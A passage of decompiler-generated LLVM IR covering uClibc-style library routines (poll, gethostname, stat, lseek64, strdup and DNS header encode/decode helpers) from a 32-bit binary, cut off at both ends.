  uselistorder i32 %tmp18, { 9, 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 %tmp12, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 19, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15, 17, 18 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 17, 18, 3, 2, 5, 4, 6, 19, 20, 8, 7, 10, 9, 11, 13, 12, 15, 14, 16 }
  uselistorder i32 ()* @free, { 23, 22, 21, 20, 19, 18, 12, 11, 10, 9, 8, 7, 6, 5, 4, 24, 30, 29, 28, 17, 16, 15, 14, 1, 13, 27, 26, 25, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__get_hosts_byname_r, { 1, 0 }
  uselistorder label %dec_label_pc_1d2ec, { 8, 6, 0, 3, 7, 4, 5, 2, 1 }
  uselistorder label %dec_label_pc_1d2e8, { 1, 0 }
  uselistorder label %dec_label_pc_1d2d4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1d290, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1d0c0, { 2, 0, 1 }
}

define i32 @__GI_poll(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1d2fc = load i32, i32* @r7, align 4
  store i32 %v3_1d2fc, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1d324, label %dec_label_pc_1d314

dec_label_pc_1d314:                               ; preds = %entry
  %v0_1d314 = call i32 @__GI___errno_location()
  %v0_1d318 = load i32, i32* %r7.global-to-local, align 4
  %v1_1d318 = sub i32 0, %v0_1d318
  %v2_1d31c = inttoptr i32 %v0_1d314 to i32*
  store i32 %v1_1d318, i32* %v2_1d31c, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1d328.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1d324

dec_label_pc_1d324:                               ; preds = %entry, %dec_label_pc_1d314
  %v2_1d328 = phi i32 [ %v3_1d2fc, %entry ], [ %v2_1d328.pre, %dec_label_pc_1d314 ]
  %v0_1d324 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1d314 ]
  store i32 %v2_1d328, i32* @r7, align 4
  ret i32 %v0_1d324

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1d324, { 1, 0 }
}

define i32 @__GI_gethostname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-341 = alloca i32, align 4
  %stack_var_-406 = alloca i32, align 4
  %v2_1d33c = ptrtoint i32* %stack_var_-406 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_1d34c = call i32 @uname(i32 %v2_1d33c)
  %v7_1d350 = icmp eq i32 %v1_1d34c, -1
  br i1 %v7_1d350, label %bb, label %dec_label_pc_1d35c

bb:                                               ; preds = %entry
  store i32 %v1_1d34c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1d398

dec_label_pc_1d35c:                               ; preds = %entry
  %v2_1d35c = ptrtoint i32* %stack_var_-341 to i32
  %tmp10 = bitcast i32* %stack_var_-341 to i8*
  %v3_1d364 = call i32 @strlen(i8* %tmp10)
  %v1_1d368 = add i32 %v3_1d364, 1
  %v1_1d36c = load i32, i32* %r5.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_1d368, %v1_1d36c
  br i1 %tmp, label %dec_label_pc_1d374, label %dec_label_pc_1d388

dec_label_pc_1d374:                               ; preds = %dec_label_pc_1d35c
  %v0_1d374 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1d380 = inttoptr i32 %v0_1d374 to i32*
  store i32 22, i32* %v2_1d380, align 4
  %v0_1d398.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1d398

dec_label_pc_1d388:                               ; preds = %dec_label_pc_1d35c
  %v0_1d388 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v2_1d35c, i32* @r1, align 4
  %v2_1d390 = inttoptr i32 %v0_1d388 to i8*
  %v3_1d390 = call i32 @strcpy(i8* %v2_1d390, i32 %v2_1d35c)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1d398

dec_label_pc_1d398:                               ; preds = %bb, %dec_label_pc_1d374, %dec_label_pc_1d388
  %v0_1d398 = phi i32 [ %v1_1d34c, %bb ], [ %v0_1d398.pre, %dec_label_pc_1d374 ], [ 0, %dec_label_pc_1d388 ]
  ret i32 %v0_1d398

; uselistorder directives
  uselistorder i32 %v2_1d35c, { 1, 0 }
  uselistorder i32 %v1_1d34c, { 1, 2, 0 }
  uselistorder i32 (i8*, i32)* @strcpy, { 5, 6, 7, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 22, { 3, 17, 4, 5, 19, 6, 7, 8, 9, 15, 10, 11, 12, 16, 13, 0, 18, 14, 1, 2, 20 }
  uselistorder label %dec_label_pc_1d398, { 2, 1, 0 }
}

define i32 @__GI_stat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1d3e0, label %dec_label_pc_1d3cc

dec_label_pc_1d3cc:                               ; preds = %entry
  %v0_1d3cc = call i32 @__GI___errno_location()
  %v0_1d3d0 = load i32, i32* %r7.global-to-local, align 4
  %v1_1d3d0 = sub i32 0, %v0_1d3d0
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1d3d8 = inttoptr i32 %v0_1d3cc to i32*
  store i32 %v1_1d3d0, i32* %v2_1d3d8, align 4
  br label %dec_label_pc_1d3f0

dec_label_pc_1d3e0:                               ; preds = %entry
  %v2_1d3e0 = icmp eq i32 %arg1, 0
  br i1 %v2_1d3e0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1d3e0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1d3e0, %bb
  call void @__pseudo_cond_branch(i1 %v2_1d3e0, i32 ptrtoint (i32* @global_var_1b4f4.1172 to i32))
  br label %dec_label_pc_1d3f0

dec_label_pc_1d3f0:                               ; preds = %dec_label_pc_1d3cc, %.thread
  %v0_1d3f0 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_1d3f0

; uselistorder directives
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1d3f0, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1d440, label %dec_label_pc_1d42c

dec_label_pc_1d42c:                               ; preds = %entry
  %v0_1d42c = call i32 @__GI___errno_location()
  %v0_1d430 = load i32, i32* %r4.global-to-local, align 4
  %v1_1d430 = sub i32 0, %v0_1d430
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1d438 = inttoptr i32 %v0_1d42c to i32*
  store i32 %v1_1d430, i32* %v2_1d438, align 4
  %v0_1d448.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1d448

dec_label_pc_1d440:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %v2_1d440 = icmp eq i32 %arg1, 0
  br i1 %v2_1d440, label %dec_label_pc_1d454, label %dec_label_pc_1d448

dec_label_pc_1d448:                               ; preds = %dec_label_pc_1d440, %dec_label_pc_1d42c
  %v0_1d448 = phi i32 [ %arg1, %dec_label_pc_1d440 ], [ %v0_1d448.pre, %dec_label_pc_1d42c ]
  br label %dec_label_pc_1d458

dec_label_pc_1d454:                               ; preds = %dec_label_pc_1d440
  br label %dec_label_pc_1d458

dec_label_pc_1d458:                               ; preds = %dec_label_pc_1d448, %dec_label_pc_1d454
  %v1_1d460 = phi i32 [ %v0_1d448, %dec_label_pc_1d448 ], [ %tmp8, %dec_label_pc_1d454 ]
  ret i32 %v1_1d460

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1d458, { 1, 0 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1d470 = load i32, i32* @r0, align 4
  %v1_1d470 = load i32, i32* @r1, align 4
  %v2_1d470 = inttoptr i32 %v0_1d470 to i8*
  %v3_1d470 = call i32 @_memcpy(i8* %v2_1d470, i32 %v1_1d470)
  ret i32 %v3_1d470

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 0, 2, 1 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_1d480 = load i32, i32* @r4, align 4
  store i32 %v3_1d480, i32* %stack_var_-16, align 4
  %v9_1d480 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r6, align 4
  %v3_1d488 = call i32 @strlen(i8* %arg1)
  %v1_1d48c = add i32 %v3_1d488, 1
  store i32 %v1_1d48c, i32* @r4, align 4
  %v1_1d494 = call i32 @malloc(i32 %v1_1d48c)
  store i32 %v1_1d494, i32* %r5.global-to-local, align 4
  %v2_1d498 = icmp eq i32 %v1_1d494, 0
  br i1 %v2_1d498, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v1_1d4a4 = xor i1 %v2_1d498, true
  call void @__pseudo_cond_branch(i1 %v1_1d4a4, i32 ptrtoint (i32* @global_var_15270.1094 to i32))
  %v0_1d4a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1d4ac = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1d4ac, i32* @r4, align 4
  store i32 %v9_1d480, i32* @r6, align 4
  ret i32 %v0_1d4a8

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 14, 13, 12, 6, 5, 15, 16, 22, 11, 10, 9, 1, 8, 7, 21, 20, 19, 18, 17, 4, 3, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_1d4b8 = load i32, i32* @lr, align 4
  store i32 %v0_1d4b8, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v7_1d4c4 = icmp sgt i32 %arg3, 11
  br i1 %v7_1d4c4, label %dec_label_pc_1d4cc, label %dec_label_pc_1d598

dec_label_pc_1d4cc:                               ; preds = %entry
  %tmp16 = inttoptr i32 %arg2 to i8*
  %v1_1d4cc = add i32 %tmp, 1
  %v2_1d4cc = inttoptr i32 %v1_1d4cc to i8*
  %v3_1d4cc = load i8, i8* %v2_1d4cc, align 1
  store i8 %v3_1d4cc, i8* %tmp16, align 1
  %v0_1d4d4 = load i32, i32* %ip.global-to-local, align 4
  %v1_1d4d4 = inttoptr i32 %v0_1d4d4 to i32*
  %v2_1d4d4 = load i32, i32* %v1_1d4d4, align 4
  %v1_1d4d8 = trunc i32 %v2_1d4d4 to i8
  %v4_1d4d8 = add i32 %arg2, 1
  %v5_1d4d8 = inttoptr i32 %v4_1d4d8 to i8*
  store i8 %v1_1d4d8, i8* %v5_1d4d8, align 1
  %v0_1d4dc = load i32, i32* %ip.global-to-local, align 4
  %v1_1d4dc = add i32 %v0_1d4dc, 8
  %v2_1d4dc = inttoptr i32 %v1_1d4dc to i32*
  %v3_1d4dc = load i32, i32* %v2_1d4dc, align 4
  %v1_1d4e0 = add i32 %v0_1d4dc, 20
  %v2_1d4e0 = inttoptr i32 %v1_1d4e0 to i32*
  %v3_1d4e0 = load i32, i32* %v2_1d4e0, align 4
  %v1_1d4e4 = add i32 %v0_1d4dc, 4
  %v2_1d4e4 = inttoptr i32 %v1_1d4e4 to i32*
  %v3_1d4e4 = load i32, i32* %v2_1d4e4, align 4
  %v1_1d4e8 = add i32 %v0_1d4dc, 12
  %v2_1d4e8 = inttoptr i32 %v1_1d4e8 to i32*
  %v3_1d4e8 = load i32, i32* %v2_1d4e8, align 4
  %v2_1d4ec = icmp eq i32 %v3_1d4e0, 0
  br i1 %v2_1d4ec, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_1d4cc
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_1d4cc, %bb
  %v0_1d4fc = phi i32 [ 0, %dec_label_pc_1d4cc ], [ 1, %bb ]
  %v1_1d4f4 = urem i32 %v3_1d4dc, 16
  %v2_1d4f8 = icmp eq i32 %v3_1d4e4, 0
  %v4_1d4fc = mul nuw nsw i32 %v1_1d4f4, 8
  %v5_1d4fc = or i32 %v0_1d4fc, %v4_1d4fc
  %v1_1d500 = add i32 %v0_1d4dc, 16
  %v2_1d500 = inttoptr i32 %v1_1d500 to i32*
  %v3_1d500 = load i32, i32* %v2_1d500, align 4
  %. = select i1 %v2_1d4f8, i32 0, i32 128
  %v2_1d50c = icmp eq i32 %v3_1d4e8, 0
  %storemerge11 = select i1 %v2_1d50c, i32 0, i32 4
  %v2_1d518 = or i32 %v5_1d4fc, %.
  %v2_1d51c = icmp eq i32 %v3_1d500, 0
  %.26 = select i1 %v2_1d51c, i32 0, i32 2
  %v2_1d528 = or i32 %v2_1d518, %storemerge11
  %v2_1d52c = or i32 %v2_1d528, %.26
  %v1_1d530 = trunc i32 %v2_1d52c to i8
  %v2_1d530 = load i32, i32* %lr.global-to-local, align 4
  %v3_1d530 = add i32 %v2_1d530, 2
  %v4_1d530 = inttoptr i32 %v3_1d530 to i8*
  store i8 %v1_1d530, i8* %v4_1d530, align 1
  %v0_1d534 = load i32, i32* %ip.global-to-local, align 4
  %v1_1d534 = add i32 %v0_1d534, 24
  %v1_1d538 = inttoptr i32 %v1_1d534 to i32*
  %v2_1d538 = load i32, i32* %v1_1d538, align 4
  %v3_1d538 = add i32 %v0_1d534, 28
  %v4_1d538 = inttoptr i32 %v3_1d538 to i32*
  %v5_1d538 = load i32, i32* %v4_1d538, align 4
  %v2_1d53c = icmp eq i32 %v2_1d538, 0
  %v1_1d540 = urem i32 %v5_1d538, 16
  %v0_1d54c = select i1 %v2_1d53c, i32 0, i32 128
  %v2_1d54c = or i32 %v1_1d540, %v0_1d54c
  %v1_1d550 = trunc i32 %v2_1d54c to i8
  %v2_1d550 = load i32, i32* %lr.global-to-local, align 4
  %v3_1d550 = add i32 %v2_1d550, 3
  %v4_1d550 = inttoptr i32 %v3_1d550 to i8*
  store i8 %v1_1d550, i8* %v4_1d550, align 1
  %v0_1d554 = load i32, i32* %ip.global-to-local, align 4
  %v1_1d554 = add i32 %v0_1d554, 33
  %v2_1d554 = inttoptr i32 %v1_1d554 to i8*
  %v3_1d554 = load i8, i8* %v2_1d554, align 1
  %v2_1d558 = load i32, i32* %lr.global-to-local, align 4
  %v3_1d558 = add i32 %v2_1d558, 4
  %v4_1d558 = inttoptr i32 %v3_1d558 to i8*
  store i8 %v3_1d554, i8* %v4_1d558, align 1
  %v0_1d55c = load i32, i32* %ip.global-to-local, align 4
  %v1_1d55c = add i32 %v0_1d55c, 32
  %v2_1d55c = inttoptr i32 %v1_1d55c to i32*
  %v3_1d55c = load i32, i32* %v2_1d55c, align 4
  %v1_1d560 = trunc i32 %v3_1d55c to i8
  %v2_1d560 = load i32, i32* %lr.global-to-local, align 4
  %v3_1d560 = add i32 %v2_1d560, 5
  %v4_1d560 = inttoptr i32 %v3_1d560 to i8*
  store i8 %v1_1d560, i8* %v4_1d560, align 1
  %v0_1d564 = load i32, i32* %ip.global-to-local, align 4
  %v1_1d564 = add i32 %v0_1d564, 37
  %v2_1d564 = inttoptr i32 %v1_1d564 to i8*
  %v3_1d564 = load i8, i8* %v2_1d564, align 1
  %v2_1d568 = load i32, i32* %lr.global-to-local, align 4
  %v3_1d568 = add i32 %v2_1d568, 6
  %v4_1d568 = inttoptr i32 %v3_1d568 to i8*
  store i8 %v3_1d564, i8* %v4_1d568, align 1
  %v0_1d56c = load i32, i32* %ip.global-to-local, align 4
  %v1_1d56c = add i32 %v0_1d56c, 36
  %v2_1d56c = inttoptr i32 %v1_1d56c to i32*
  %v3_1d56c = load i32, i32* %v2_1d56c, align 4
  %v1_1d570 = trunc i32 %v3_1d56c to i8
  %v2_1d570 = load i32, i32* %lr.global-to-local, align 4
  %v3_1d570 = add i32 %v2_1d570, 7
  %v4_1d570 = inttoptr i32 %v3_1d570 to i8*
  store i8 %v1_1d570, i8* %v4_1d570, align 1
  %v0_1d574 = load i32, i32* %ip.global-to-local, align 4
  %v1_1d574 = add i32 %v0_1d574, 41
  %v2_1d574 = inttoptr i32 %v1_1d574 to i8*
  %v3_1d574 = load i8, i8* %v2_1d574, align 1
  %v2_1d578 = load i32, i32* %lr.global-to-local, align 4
  %v3_1d578 = add i32 %v2_1d578, 8
  %v4_1d578 = inttoptr i32 %v3_1d578 to i8*
  store i8 %v3_1d574, i8* %v4_1d578, align 1
  %v0_1d57c = load i32, i32* %ip.global-to-local, align 4
  %v1_1d57c = add i32 %v0_1d57c, 40
  %v2_1d57c = inttoptr i32 %v1_1d57c to i32*
  %v3_1d57c = load i32, i32* %v2_1d57c, align 4
  %v1_1d580 = trunc i32 %v3_1d57c to i8
  %v2_1d580 = load i32, i32* %lr.global-to-local, align 4
  %v3_1d580 = add i32 %v2_1d580, 9
  %v4_1d580 = inttoptr i32 %v3_1d580 to i8*
  store i8 %v1_1d580, i8* %v4_1d580, align 1
  %v0_1d584 = load i32, i32* %ip.global-to-local, align 4
  %v1_1d584 = add i32 %v0_1d584, 45
  %v2_1d584 = inttoptr i32 %v1_1d584 to i8*
  %v3_1d584 = load i8, i8* %v2_1d584, align 1
  %v2_1d588 = load i32, i32* %lr.global-to-local, align 4
  %v3_1d588 = add i32 %v2_1d588, 10
  %v4_1d588 = inttoptr i32 %v3_1d588 to i8*
  store i8 %v3_1d584, i8* %v4_1d588, align 1
  %v0_1d58c = load i32, i32* %ip.global-to-local, align 4
  %v1_1d58c = add i32 %v0_1d58c, 44
  %v2_1d58c = inttoptr i32 %v1_1d58c to i32*
  %v3_1d58c = load i32, i32* %v2_1d58c, align 4
  %v1_1d590 = trunc i32 %v3_1d58c to i8
  %v2_1d590 = load i32, i32* %lr.global-to-local, align 4
  %v3_1d590 = add i32 %v2_1d590, 11
  %v4_1d590 = inttoptr i32 %v3_1d590 to i8*
  store i8 %v1_1d590, i8* %v4_1d590, align 1
  %v2_1d598.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_1d598

dec_label_pc_1d598:                               ; preds = %entry, %bb17
  %v2_1d598 = phi i32 [ %v2_1d598.pre, %bb17 ], [ %v0_1d4b8, %entry ]
  %storemerge = phi i32 [ 12, %bb17 ], [ -1, %entry ]
  store i32 %v2_1d598, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1d4dc, { 0, 2, 1, 3, 4 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 45, { 3, 2, 0, 5, 4, 1 }
  uselistorder i32 37, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1d598, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_1d5a0 = load i8, i8* %arg1, align 1
  %v4_1d5a0 = zext i8 %v3_1d5a0 to i32
  %v2_1d5a4 = add i32 %tmp, 1
  %v3_1d5a4 = inttoptr i32 %v2_1d5a4 to i8*
  %v4_1d5a4 = load i8, i8* %v3_1d5a4, align 1
  %v5_1d5a4 = zext i8 %v4_1d5a4 to i32
  %v4_1d5a8 = mul nuw nsw i32 %v4_1d5a0, 256
  %v5_1d5a8 = or i32 %v5_1d5a4, %v4_1d5a8
  %v2_1d5ac = inttoptr i32 %arg2 to i32*
  store i32 %v5_1d5a8, i32* %v2_1d5ac, align 4
  %v2_1d5b0 = add i32 %tmp, 2
  %v3_1d5b0 = inttoptr i32 %v2_1d5b0 to i8*
  %v4_1d5b0 = load i8, i8* %v3_1d5b0, align 1
  %tmp3 = icmp slt i8 %v4_1d5b0, 0
  %v3_1d5b4 = zext i1 %tmp3 to i32
  %v2_1d5b8 = add i32 %arg2, 4
  %v3_1d5b8 = inttoptr i32 %v2_1d5b8 to i32*
  store i32 %v3_1d5b4, i32* %v3_1d5b8, align 4
  %v4_1d5bc = load i8, i8* %v3_1d5b0, align 1
  %div = udiv i8 %v4_1d5bc, 8
  %tmp4 = urem i8 %div, 16
  %v1_1d5c4 = zext i8 %tmp4 to i32
  %v2_1d5c8 = add i32 %arg2, 8
  %v3_1d5c8 = inttoptr i32 %v2_1d5c8 to i32*
  store i32 %v1_1d5c4, i32* %v3_1d5c8, align 4
  %v4_1d5cc = load i8, i8* %v3_1d5b0, align 1
  %div1 = udiv i8 %v4_1d5cc, 4
  %tmp5 = urem i8 %div1, 2
  %v1_1d5d4 = zext i8 %tmp5 to i32
  %v2_1d5d8 = add i32 %arg2, 12
  %v3_1d5d8 = inttoptr i32 %v2_1d5d8 to i32*
  store i32 %v1_1d5d4, i32* %v3_1d5d8, align 4
  %v4_1d5dc = load i8, i8* %v3_1d5b0, align 1
  %div2 = udiv i8 %v4_1d5dc, 2
  %tmp6 = urem i8 %div2, 2
  %v1_1d5e4 = zext i8 %tmp6 to i32
  %v2_1d5e8 = add i32 %arg2, 16
  %v3_1d5e8 = inttoptr i32 %v2_1d5e8 to i32*
  store i32 %v1_1d5e4, i32* %v3_1d5e8, align 4
  %v4_1d5ec = load i8, i8* %v3_1d5b0, align 1
  %tmp7 = urem i8 %v4_1d5ec, 2
  %v1_1d5f0 = zext i8 %tmp7 to i32
  %v2_1d5f4 = add i32 %arg2, 20
  %v3_1d5f4 = inttoptr i32 %v2_1d5f4 to i32*
  store i32 %v1_1d5f0, i32* %v3_1d5f4, align 4
  %v2_1d5f8 = add i32 %tmp, 3
  %v3_1d5f8 = inttoptr i32 %v2_1d5f8 to i8*
  %v4_1d5f8 = load i8, i8* %v3_1d5f8, align 1
  %tmp8 = icmp slt i8 %v4_1d5f8, 0
  %v3_1d5fc = zext i1 %tmp8 to i32
  %v2_1d600 = add i32 %arg2, 24
  %v3_1d600 = inttoptr i32 %v2_1d600 to i32*
  store i32 %v3_1d5fc, i32* %v3_1d600, align 4
  %v4_1d604 = load i8, i8* %v3_1d5f8, align 1
  %tmp9 = urem i8 %v4_1d604, 16
  %v1_1d608 = zext i8 %tmp9 to i32
  %v2_1d60c = add i32 %arg2, 28
  %v3_1d60c = inttoptr i32 %v2_1d60c to i32*
  store i32 %v1_1d608, i32* %v3_1d60c, align 4
  %v2_1d610 = add i32 %tmp, 4
  %v3_1d610 = inttoptr i32 %v2_1d610 to i8*
  %v4_1d610 = load i8, i8* %v3_1d610, align 1
  %v5_1d610 = zext i8 %v4_1d610 to i32
  %v2_1d614 = add i32 %tmp, 5
  %v3_1d614 = inttoptr i32 %v2_1d614 to i8*
  %v4_1d614 = load i8, i8* %v3_1d614, align 1
  %v5_1d614 = zext i8 %v4_1d614 to i32
  %v4_1d618 = mul nuw nsw i32 %v5_1d610, 256
  %v5_1d618 = or i32 %v5_1d614, %v4_1d618
  %v2_1d61c = add i32 %arg2, 32
  %v3_1d61c = inttoptr i32 %v2_1d61c to i32*
  store i32 %v5_1d618, i32* %v3_1d61c, align 4
  %v2_1d620 = add i32 %tmp, 6
  %v3_1d620 = inttoptr i32 %v2_1d620 to i8*
  %v4_1d620 = load i8, i8* %v3_1d620, align 1
  %v5_1d620 = zext i8 %v4_1d620 to i32
  %v2_1d624 = add i32 %tmp, 7
  %v3_1d624 = inttoptr i32 %v2_1d624 to i8*
  %v4_1d624 = load i8, i8* %v3_1d624, align 1
  %v5_1d624 = zext i8 %v4_1d624 to i32
  %v4_1d628 = mul nuw nsw i32 %v5_1d620, 256
  %v5_1d628 = or i32 %v5_1d624, %v4_1d628
  %v2_1d62c = add i32 %arg2, 36
  %v3_1d62c = inttoptr i32 %v2_1d62c to i32*
  store i32 %v5_1d628, i32* %v3_1d62c, align 4
  %v2_1d630 = add i32 %tmp, 8
  %v3_1d630 = inttoptr i32 %v2_1d630 to i8*
  %v4_1d630 = load i8, i8* %v3_1d630, align 1
  %v5_1d630 = zext i8 %v4_1d630 to i32
  %v2_1d634 = add i32 %tmp, 9
  %v3_1d634 = inttoptr i32 %v2_1d634 to i8*
  %v4_1d634 = load i8, i8* %v3_1d634, align 1
  %v5_1d634 = zext i8 %v4_1d634 to i32
  %v4_1d638 = mul nuw nsw i32 %v5_1d630, 256
  %v5_1d638 = or i32 %v5_1d634, %v4_1d638
  %v2_1d63c = add i32 %arg2, 40
  %v3_1d63c = inttoptr i32 %v2_1d63c to i32*
  store i32 %v5_1d638, i32* %v3_1d63c, align 4
  %v2_1d640 = add i32 %tmp, 11
  %v3_1d640 = inttoptr i32 %v2_1d640 to i8*
  %v4_1d640 = load i8, i8* %v3_1d640, align 1
  %v5_1d640 = zext i8 %v4_1d640 to i32
  %v2_1d644 = add i32 %tmp, 10
  %v3_1d644 = inttoptr i32 %v2_1d644 to i8*
  %v4_1d644 = load i8, i8* %v3_1d644, align 1
  %v5_1d644 = zext i8 %v4_1d644 to i32
  %v4_1d648 = mul nuw nsw i32 %v5_1d644, 256
  %v5_1d648 = or i32 %v4_1d648, %v5_1d640
  %v2_1d64c = add i32 %arg2, 44
  %v3_1d64c = inttoptr i32 %v2_1d64c to i32*
  store i32 %v5_1d648, i32* %v3_1d64c, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 44, { 14, 15, 12, 13, 2, 16, 11, 40, 1, 3, 24, 25, 26, 27, 28, 29, 21, 22, 23, 17, 18, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 0, 4, 19, 5, 6, 7, 8, 9, 20, 10 }
  uselistorder i32 11, { 20, 21, 7, 8, 9, 10, 11, 22, 24, 12, 4, 5, 6, 13, 14, 15, 16, 17, 18, 0, 19, 3, 2, 1, 23 }
  uselistorder i32 40, { 12, 13, 16, 1, 5, 14, 17, 2, 15, 4, 3, 0, 6, 7, 8, 9, 10, 11, 18 }
  uselistorder i32 36, { 28, 29, 32, 33, 34, 35, 9, 5, 8, 30, 10, 24, 11, 25, 12, 1, 6, 31, 13, 14, 15, 16, 0, 2, 17, 18, 4, 19, 20, 26, 27, 21, 22, 3, 7, 36, 23 }
  uselistorder i32 7, { 21, 22, 16, 0, 11, 12, 1, 2, 24, 18, 19, 20, 3, 4, 5, 6, 17, 7, 13, 14, 8, 9, 15, 10, 23 }
  uselistorder i32 28, { 48, 6, 8, 51, 7, 54, 55, 60, 62, 63, 9, 10, 61, 11, 12, 56, 35, 49, 50, 29, 13, 30, 14, 66, 47, 64, 15, 1, 36, 16, 17, 18, 3, 19, 52, 53, 2, 57, 58, 37, 38, 39, 40, 41, 42, 43, 0, 44, 31, 59, 32, 33, 34, 4, 5, 45, 24, 23, 21, 22, 28, 25, 26, 46, 20, 27, 65 }
  uselistorder i8 2, { 1, 2, 3, 4, 0, 5 }
  uselistorder i8 4, { 2, 0, 1 }
  uselistorder i8 16, { 1, 2, 0, 3 }
  uselistorder i8 8, { 1, 0 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1d654 = load i32, i32* @r4, align 4
  store i32 %v3_1d654, i32* %stack_var_-16, align 4
  %v9_1d654 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_1d65c = load i32, i32* %arg1, align 4
  store i32 %v2_1d65c, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  %v1_1d668 = inttoptr i32 %v2_1d65c to i8*
  %v2_1d668 = call i32 @__encode_dotted(i8* %v1_1d668)
  store i32 %v2_1d668, i32* %r0.global-to-local, align 4
  %v1_1d66c = icmp slt i32 %v2_1d668, 0
  br i1 %v1_1d66c, label %dec_label_pc_1d6ac, label %dec_label_pc_1d674

dec_label_pc_1d674:                               ; preds = %entry
  %v1_1d674 = load i32, i32* @r5, align 4
